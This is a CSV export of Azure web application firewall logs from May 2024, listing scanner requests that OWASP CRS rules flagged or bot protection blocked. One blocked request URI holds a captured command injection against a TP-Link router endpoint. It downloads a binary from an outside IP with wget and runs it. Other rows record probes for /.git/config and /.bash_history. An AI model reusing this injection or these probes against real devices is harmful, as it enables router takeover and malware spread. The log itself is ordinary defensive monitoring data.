TenantId,"TimeGenerated [Local Time]",OperationName,InstanceId,ClientIp,ClientPort,RequestUri,RuleSetType,RuleSetVersion,RuleId,Message,Action,Site,DetailedMessage,DetailedData,FileDetails,LineDetails,Hostname,TransactionId,SourceSystem,Type,"_ResourceId"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/3/2024, 2:00:34.000 PM",ApplicationGatewayFirewall,"appgw_1","143.198.204.194",,"/cdn-cgi/trace","OWASP CRS","3.2",920300,"Request Missing an Accept Header",Matched,,"Equal 0; Pattern match ^OPTIONS$; Pattern match AppleWebKit Android at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]} and { found within [REQUEST_METHOD:]} and { found within [REQUEST_HEADERS:]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1143,"speed.cloudflare.com",01b75926e10f075076df45bd4a40fa57,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/3/2024, 2:07:49.000 PM",ApplicationGatewayFirewall,"appgw_3","205.210.31.89",,"/","OWASP CRS","3.2",920300,"Request Missing an Accept Header",Matched,,"Equal 0; Pattern match ^OPTIONS$; Pattern match AppleWebKit Android at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]} and { found within [REQUEST_METHOD:]} and { found within [REQUEST_HEADERS:]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1143,"51.8.97.212:80",9a4c775696f93dbc0b8c2adf385a5298,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/3/2024, 2:07:49.000 PM",ApplicationGatewayFirewall,"appgw_3","205.210.31.89",,"/login.php","OWASP CRS","3.2",920300,"Request Missing an Accept Header",Matched,,"Equal 0; Pattern match ^OPTIONS$; Pattern match AppleWebKit Android at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]} and { found within [REQUEST_METHOD:]} and { found within [REQUEST_HEADERS:]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1143,"51.8.97.212:80",bf143d2ae7c1af54995f23977b853347,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/3/2024, 1:40:57.000 PM",ApplicationGatewayFirewall,"appgw_3","179.43.188.106",,"/","OWASP CRS","3.2",920300,"Request Missing an Accept Header",Matched,,"Equal 0; Pattern match ^OPTIONS$; Pattern match AppleWebKit Android at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]} and { found within [REQUEST_METHOD:]} and { found within [REQUEST_HEADERS:]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1143,"51.8.97.212:80",4236db65efe575a9d018448107e522cb,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/3/2024, 1:40:57.000 PM",ApplicationGatewayFirewall,"appgw_3","179.43.188.106",,"/login.php","OWASP CRS","3.2",920300,"Request Missing an Accept Header",Matched,,"Equal 0; Pattern match ^OPTIONS$; Pattern match AppleWebKit Android at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]} and { found within [REQUEST_METHOD:]} and { found within [REQUEST_HEADERS:]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1143,"51.8.97.212:80",2be542755e599a08b0249e6a5ea6685b,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/3/2024, 1:42:08.000 PM",ApplicationGatewayFirewall,"appgw_3","213.0.77.188",,"/.bash_history",MicrosoftBotProtection,,,"Found bot IP address 213.0.77.188 in RemoteAddr",Blocked,,,,,,,f42084d619d7edba9c801a6547a10236,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 2:09:19.000 PM",ApplicationGatewayFirewall,"appgw_1","167.71.202.190",,"/cdn-cgi/trace","OWASP CRS","3.2",920300,"Request Missing an Accept Header",Matched,,"Equal 0; Pattern match ^OPTIONS$; Pattern match AppleWebKit Android at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]} and { found within [REQUEST_METHOD:]} and { found within [REQUEST_HEADERS:]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1143,"speed.cloudflare.com",2426f6e8f9ac2894df1037293bda786c,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:13:24.000 PM",ApplicationGatewayFirewall,"appgw_3","199.45.154.30",,"/",MicrosoftBotProtection,,,"Found bot IP address 199.45.154.30 in RemoteAddr",Blocked,,,,,,"51.8.97.212:80",b42c222724d32bb4b437a1f970a382e0,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:13:27.000 PM",ApplicationGatewayFirewall,"appgw_3","199.45.154.30",,"/",MicrosoftBotProtection,,,"Found bot IP address 199.45.154.30 in RemoteAddr",Blocked,,,,,,"51.8.97.212",f233d5b8ed8e70f6770e263471bb17b4,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:32:15.000 PM",ApplicationGatewayFirewall,"appgw_1","185.16.38.111",,"/","OWASP CRS","3.2",920320,"Missing User Agent Header",Matched,,"Equal 0 at REQUEST_HEADERS:user-agent.","{ found within [REQUEST_HEADERS:0]}","REQUEST-920-PROTOCOL-ENFORCEMENT.conf",1176,"51.8.97.212:80",c668e1de92648e9549b168a9d6dd3ba6,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:38:49.000 PM",ApplicationGatewayFirewall,"appgw_3","195.1.144.107",,"/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.14.226.142/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`)",MicrosoftBotProtection,,,"Found bot IP address 195.1.144.107 in RemoteAddr",Blocked,,,,,,"51.8.97.212:80",1a76bded482a84374dfc344061132298,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:48:33.000 PM",ApplicationGatewayFirewall,"appgw_3","45.95.146.29",,"/boaform/admin/formLogin",MicrosoftBotProtection,,,"Found bot IP address 45.95.146.29 in RemoteAddr",Blocked,,,,,,"51.8.97.212:80",9623a750b1c8572bef5b102b6853350e,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 3:49:56.000 PM",ApplicationGatewayFirewall,"appgw_3","104.199.31.214",,"/",MicrosoftBotProtection,,,"Found bot IP address 104.199.31.214 in RemoteAddr",Blocked,,,,,,"51.8.97.212",2e8548a75322590e2c0b8a1aee68b207,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
"1824ce35-604f-4dde-b17a-1f7b930e64ea","5/1/2024, 4:58:53.000 PM",ApplicationGatewayFirewall,"appgw_3","31.7.62.226",,"/.git/config","OWASP CRS","3.2",930130,"Restricted File Access Attempt",Matched,,"Pattern match from file restricted-files.data at REQUEST_FILENAME.","{/.git/ found within [REQUEST_FILENAME:/.git/config]}","REQUEST-930-APPLICATION-ATTACK-LFI.conf",101,"51.8.97.212",b874681d5c0176a24417e0afb9a9b4c7,,AGWFirewallLogs,"/subscriptions/5b7f3410-4e34-46e3-b2c3-924befb3df82/resourcegroups/csec/providers/microsoft.network/applicationgateways/waf-gateway"
